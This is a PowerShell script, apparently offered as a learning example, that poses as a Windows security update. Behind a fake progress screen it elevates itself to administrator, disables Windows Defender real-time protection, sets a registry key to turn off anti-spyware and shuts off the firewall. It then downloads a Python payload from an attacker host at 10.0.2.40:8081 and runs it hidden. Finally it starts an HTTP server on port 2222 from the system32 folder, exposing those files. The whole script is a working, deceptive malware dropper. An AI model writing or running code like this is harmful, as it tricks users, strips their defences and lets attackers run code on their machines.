# Change IP/PORT.
# For learning purposes ONY
# Any Ideas?

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))

{

  $arguments = "& '" +$myinvocation.mycommand.definition + "'"

  Start-Process powershell -Verb runAs -ArgumentList $arguments

  Break

}
for ($i = 1; $i -le 50; $i++ ) {
    Write-Progress -Activity "Please wait while Windows is checking for updates..." -Status "$i% Complete:" -PercentComplete $i
    Start-Sleep -Milliseconds 0.700
}

Start-Sleep -Seconds 1
Write-Host "`r`n`r`n`r`n`r`n`r`n"
write-Host ="
                 __
            ,-~¨^  ^¨-,           _,
           /          / ;^-._...,¨/
          /          / /         /
         /          / /         /
        /          / /         /
       /,.-:''-,_ / /         /
       _,.-:--._ ^ ^:-._ __../
     /^         / /¨:.._¨__.;
    /          / /      ^  /
   /          / /         /
  /          / /         /
 /_,.--:^-._/ /         /
^            ^¨¨-.___.:^
"


Write-Output "[!] SECURITY UPDATE! Do not turn off device.....`r`n"
# WRITING A MESSAGE FOR THE [VICTIM] ABOUT SOME CRITICAL UPDATES
Start-Sleep -Seconds 3
Write-Output "`r`n[!] WINDOWS FOUND SOME CRITICAL PROBLEMS! `r`n"
# SLEEP FOR 2 SECONDS
Start-Sleep -Second 2
Write-Host "please wait for the process to finish.`r`n" -ForegroundColor green
Start-Sleep -Second 2
$updateActions = @(
    "[+] Updated firewall to prove the network security.",
    "[+] Fixed bad rules in firewall configurations.",
    "[+] Patched security vulnerabilities in the operating system.",
    "[+] Improved system performance and stability.",
    "[+] Installed the latest security definitions for antivirus.",
    "[+] Updated system drivers for improved hardware compatibility."
)

foreach ($action in $updateActions) {
    Write-Host $action -ForegroundCOlor Red
    Start-Sleep -Seconds 3
}

Write-Output "Windows Update has been completed successfully."


# DISABLE THE REAL-TIME PROTECTION WHILE USING ADMINISTRATOR PRIVILEGE
$Mal = Set-MpPreference -DisableRealtimeMonitoring $true
# INJECT A MALICIOUS DWORD INSIDE REGISTRY
$Mal2 = New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# TURN OFF FIREWALL
$Mal3 = netsh advfirewall set allprofiles state off
powershell.exe -ep bypass -WindowStyle hidden -Command $Mal; Start-Sleep -Seconds 2; $Mal2; Start-Sleep -Seconds 3; $Mal3;
Start-Sleep -Seconds 3


# KEY DOWNLOAD AND SAVE ON DESKTOP ( FOR BETTER ATTACK, SAVE IT ON %TEMP% )
$Machine = "http://10.0.2.40:"
$Port = "8081"
(New-Object Net.WebClient).DownloadFile("$Machine$Port/pp.pyw", "C:\Users\public\pp.pyw");
Start-Sleep -Seconds 3
Start-Process -FilePath "py" -ArgumentList "-3", "C:\Users\public\pp.pyw" -WindowStyle Hidden
$ChangeD = cd C:\Windows\system32
powershell.exe -ep bypass -NoExit -Command "&""{$ChangeD; Start-Sleep -Seconds 2; py -3 -m http.server 2222; Start-Sleep -Seconds 2}"
